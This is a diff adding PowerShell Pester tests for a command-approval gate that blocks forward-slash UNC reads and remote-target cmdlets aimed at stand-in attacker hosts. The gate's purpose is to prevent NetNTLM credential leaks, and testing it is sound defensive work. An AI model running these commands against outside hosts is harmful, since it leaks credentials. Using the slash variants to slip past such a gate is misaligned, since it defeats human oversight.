@@ -137,6 +137,35 @@ Describe 'Resolve-LokiCommandDecision - side-effect/exfil deny (adversarial revi
         (Resolve-LokiCommandDecision -CommandLine 'Test-Path \\10.0.0.5\share\x').Reason | Should -Be 'read-side-effect-blocked'
     }
 
+    It 'never auto-allows a FORWARD-slash or mixed-slash UNC -- .NET normalizes // to a UNC too (review 2026-07-18): <cmd>' -ForEach @(
+        @{ cmd = 'Get-Content //attacker.example/share/x' }
+        @{ cmd = 'Test-Path //10.0.0.5/share' }
+        @{ cmd = 'Get-ChildItem /\attacker/share' }
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Not -Be 'read'
+    }
+
+    It 'a forward-slash UNC read is denied specifically by the side-effect rule' {
+        (Resolve-LokiCommandDecision -CommandLine 'Get-Content //attacker/share/x').Reason | Should -Be 'read-side-effect-blocked'
+    }
+
+    It 'never auto-allows a remote-target parameter on a read cmdlet (WinRM/DCOM auth -> NetNTLM leak): <cmd>' -ForEach @(
+        @{ cmd = 'Get-CimInstance Win32_OperatingSystem -ComputerName attacker.example' }
+        @{ cmd = 'Get-WinEvent -LogName System -ComputerName attacker' }
+        @{ cmd = 'Get-Service -CN attacker' }
+        @{ cmd = 'Get-CimInstance Win32_Service -CimSession sess1' }
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Be 'denied'
+    }
+
+    It 'still allows the legit LOCAL reads these rules must NOT catch (no false positive): <cmd>' -ForEach @(
+        @{ cmd = 'ipconfig /all' }                      # single slash + a switch -- not a UNC
+        @{ cmd = 'Get-CimInstance Win32_LogicalDisk' }  # local CIM, no -ComputerName
+        @{ cmd = 'ping 8.8.8.8' }                       # native reachability (bare host) -- intended diagnosis
+    ) {
+        (Resolve-LokiCommandDecision -CommandLine $cmd).Class | Should -Be 'read'
+    }
+
     It 'blocks non-space/tab whitespace riding along an otherwise-read command (Unicode separator)' {
         # U+2028 IS .NET whitespace, so the first token tokenizes cleanly to a real read cmdlet -> reaches the
         # read-enforcement control-char check, which blocks it.
